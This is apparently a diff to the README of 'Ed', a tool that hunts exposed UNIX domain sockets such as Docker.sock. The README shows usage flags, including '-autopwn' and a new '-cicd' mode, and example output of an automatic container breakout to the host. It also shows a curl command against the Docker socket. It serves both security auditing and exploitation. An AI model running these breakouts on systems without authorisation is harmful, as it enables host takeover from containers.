@@ -2,10 +2,10 @@
 Ed is a tool used to identify and exploit accessible UNIX Domain Sockets
 
 # What does it do?
-Ed is a binary to help you find and exploit accessible UNIX domain sockets on a container or host. This is useful for hunting Docker.sock when it has been mounted to a non-default location and or not mounted with the default name i.e  "/var/run/Docker.sock".
+Ed is a binary to help you find and exploit accessible UNIX domain sockets on a container or host. This is useful for example, hunting Docker.sock when it has been mounted to a non-default location and or not mounted with the default name i.e  "/var/run/Docker.sock". 
 
 # Why ed?
-Finding exposed UNIX domain sockets, especially Docker.sock, is very useful ;) Ed can be useful in a DevOps process to ensure that containers do not have any unnecessarily exposed sockets or it can be used to exploit exposed sockets to achieve container breakout.
+Finding exposed UNIX domain sockets, especially Docker.sock, is very useful ;) Ed can be useful in a DevOps process to ensure that containers do not have any unnecessarily exposed sockets or it can be used to exploit exposed sockets to achieve container breakout. Additionally, Ed can be used in a CI/CD pipeline.
 
 # Usage
 Ed can be used to look for plain 'ol UNIX domain sockets, UNIX domain sockets that respond to HTTP requests or UNIX domain sockets that behave like Docker.sock. Ed by default searches from the CWD. To use Ed, get the binary on the host and use the following options:
@@ -14,8 +14,10 @@ Ed can be used to look for plain 'ol UNIX domain sockets, UNIX domain sockets th
   ./ed -h
 [+] Hunt 'dem Socks
 Usage of ./ed:
-  -autopwn
+    -autopwn
         Attempt to autopwn exposed sockets
+  -cicd
+        Attempt to autopwn but don't drop to TTY,return exit code 1 if successful else 0
   -docker
         Hunt for docker.sock
   -http
@@ -33,7 +35,7 @@ Usage of ./ed:
 
 ```
 
-Example: Autopwn exposed Docker Domain Socket
+Example: Autopwn exposed Docker UNIX Domain Socket
 
 ```
 root@2ae7f389d44c:/app# ./ed -path=/ -autopwn=true
@@ -63,7 +65,27 @@ You are now on the underlying host
  
  ```
  
- And now that you have found an exposed Docker socket, you could go ahead and issue commands to the Docker daemon using CURL:
+ Example: Look for exposed Docker.sock, attempt to pwn it and return an exit code of 1 for your CI\CD test
+ 
+ ```
+ root@2ae7f389d44c:/app# ./ed_linux_amd64 -path=/ -cicd=true -autopwn=true
+[+] Hunt 'dem Socks
+[+] Hunting Down UNIX Domain Sockets from: /
+[*] Valid Socket: /run/docker.sock
+[+] Attempting to autopwn
+[+] Hunting Docker Socks
+[+] Attempting to Autopwn:  /run/docker.sock
+[*] Getting Docker client...
+[*] Successfully got Docker client...
+[+] Attempting to escape to host...
+[+] Attempting in CICD Mode
+[+] Finished
+root@d20b953fc52f:/app# echo $?
+1
+ 
+ ```
+ 
+ And now that you have found an exposed Docker socket, you could go ahead and issue commands to the Docker daemon using CURL or just issue the -autopwn fag;):
  
  ```
  root@70a7cf3d4f93:/app# curl --unix-socket  /var/run/docker.sock http:/docker/info
